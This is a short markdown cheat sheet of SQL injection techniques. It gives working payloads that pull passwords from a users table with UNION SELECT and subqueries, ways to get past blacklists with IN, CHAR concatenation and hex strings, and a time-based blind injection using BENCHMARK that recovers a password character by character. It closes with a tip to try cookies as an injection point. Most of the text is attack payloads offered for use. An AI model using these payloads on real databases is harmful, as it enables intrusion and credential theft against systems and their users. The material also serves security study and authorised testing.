# Basic

## Select injection

#### Basic

`-100 UNION SELECT password from users`

union the results of the intended query with more information (just make sure number of columns match)

#### Col Num Nismatch

you can use `join` instead of union

## Blacklists

#### Blocked "="?

`id = 1` can also be written as `id in (1)`

#### Blocked characters?

As long as you can use string concatination you can replace most fields where a term is blocked with

`(select CHAR(97)||CHAR(98)...)`

in addition remember sql lets you have hex strings in leu of text.

`0x12345`


## Injecting into table field

if you have something like

`select id from <injection>`

utilise sub queries, this will grab the password field instead of the id field and give it a alias so the query compiles

`select id from (select password as id from users)`

## Blind

With most queries the best thing is to write a query that will return 1 row ish and then union / and it with your target payload query.

If the query fails for whatever reason you will get 0 results whereas if it compiles without crashing you get 1 row.

In this way you can test payloads.

If you can't actually get a response then you have to do

`1 UNION SELECT IF(<test>,BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null))  FROM users WHERE user_id = 1`

here we use `BENCHMARK` which will encode "MSG" 5000000 times to cause a noticable delay.

Now we can test letter by letter for something like `SUBSTRING(user_password,1,1) = CHAR(50)` to get the characters of the password one by one

(should be scripted)

## Nothing is working!

Have you tried injecting into other fields then a text box? a cookie perhaps
